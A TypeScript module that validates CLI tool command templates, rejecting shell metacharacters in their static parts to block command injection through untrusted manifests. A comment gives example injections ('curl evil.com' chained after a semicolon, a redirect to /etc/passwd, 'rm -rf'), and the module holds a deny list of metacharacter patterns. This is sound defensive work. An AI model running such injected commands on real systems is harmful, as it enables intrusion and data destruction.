/**
 * CHANGE LOG
 * -----------------------------------------------------------------------------
 * DATE         | AUTHOR                          | DESCRIPTION
 * -----------------------------------------------------------------------------
 * 1 | maintainer@emeraldcoastsystemsgroup.com   | Fail-closed validation of CLI executor command templates at registration time (Phase 0 hardening). Rejects shell metacharacters in the static segments of a template so that the renderRuntimeTemplate shell-quote contract cannot be bypassed via the template itself.
 */

/**
 * @description Result of validating a CLI executor command template.
 */
export type CliCommandValidation = { ok: true } | { ok: false; reason: string };

/**
 * Shell metacharacters that must never appear in the STATIC (non-placeholder)
 * segments of a CLI command template.
 *
 * Why static-only: interpolated values ({input.x}, {taskId}, {agentId}) are
 * shell-quoted by ToolExecutorService.renderRuntimeTemplate, so a metacharacter
 * arriving through a placeholder is already neutralized. The remaining injection
 * surface is the template's own literal text — e.g. a manifest that registers
 *   `tool {input.q}; curl evil.com`   or   `tool > /etc/passwd`
 * These constructs let an uploaded/untrusted manifest chain commands, redirect
 * output, or spawn a command substitution regardless of how values are quoted.
 *
 * SCOPE / HONESTY: this is defense-in-depth for the injection-via-template
 * class. It does NOT contain a manifest that simply names a destructive binary
 * directly (`rm -rf /tmp/x`) — that requires the per-execution sandbox (Phase 1)
 * plus a binary allowlist. Keep that limitation in mind; this check is necessary
 * but not sufficient.
 */
const FORBIDDEN_STATIC_PATTERNS: ReadonlyArray<{ pattern: RegExp; label: string }> = [
  { pattern: /`/, label: 'backtick command substitution' },
  { pattern: /\$\(/, label: '$( command substitution' },
  { pattern: /\$\{/, label: '${ shell expansion' },
  { pattern: /;/, label: 'command separator ;' },
  { pattern: /\|/, label: 'pipe |' },
  { pattern: /&/, label: 'background/and operator &' },
  { pattern: />/, label: 'output redirect >' },
  { pattern: /</, label: 'input redirect <' },
  { pattern: /[\r\n]/, label: 'newline' },
];

/** A placeholder token is the text inside `{...}`. */
const PLACEHOLDER_RE = /\{([^}]*)\}/g;

/**
 * @description Validate a single placeholder token form. Mirrors the tokens
 * ToolExecutorService.resolveRuntimeTemplateToken accepts, so an unsupported
 * token is rejected at registration instead of failing only at execution.
 */
function isSupportedToken(token: string): boolean {
  const t = token.trim();
  if (t === 'taskId' || t === 'agentId' || t === 'input') return true;
  // input.<segment>(.<segment>)* with identifier-ish segments.
  return /^input(\.[A-Za-z0-9_-]+)+$/.test(t);
}

/**
 * @description Validate a CLI executor command template before it is persisted
 * and made executable. Returns a structured result; callers decide whether to
 * throw (write path) or skip-and-warn (restore path).
 */
export function validateCliCommandTemplate(template: string): CliCommandValidation {
  if (typeof template !== 'string' || template.trim().length === 0) {
    return { ok: false, reason: 'cliCommand template is empty' };
  }

  // 1) Every placeholder must be a supported token form.
  const tokens = [...template.matchAll(PLACEHOLDER_RE)].map((m) => m[1]);
  for (const token of tokens) {
    if (!isSupportedToken(token)) {
      return {
        ok: false,
        reason: `unsupported template token "{${token}}" (use {input}, {input.field}, {taskId}, or {agentId})`,
      };
    }
  }

  // 2) Strip placeholders, then scan only the static remainder for shell
  //    metacharacters. Values substituted into placeholders are shell-quoted
  //    at render time, so they are not part of this check.
  const staticText = template.replace(PLACEHOLDER_RE, ' ');
  for (const { pattern, label } of FORBIDDEN_STATIC_PATTERNS) {
    if (pattern.test(staticText)) {
      return {
        ok: false,
        reason: `cliCommand template contains a forbidden shell metacharacter (${label}); ` +
          'variable data must enter only through {input...} placeholders',
      };
    }
  }

  return { ok: true };
}

/**
 * @description Throwing wrapper for the write path (tool registration). A failed
 * validation is a hard, fail-closed error: the tool is never persisted or made
 * executable.
 */
export function assertSafeCliCommandTemplate(template: string | undefined, toolName: string): void {
  const result = validateCliCommandTemplate(template ?? '');
  if (!result.ok) {
    throw new Error(`Rejected cli tool "${toolName}": ${result.reason}`);
  }
}
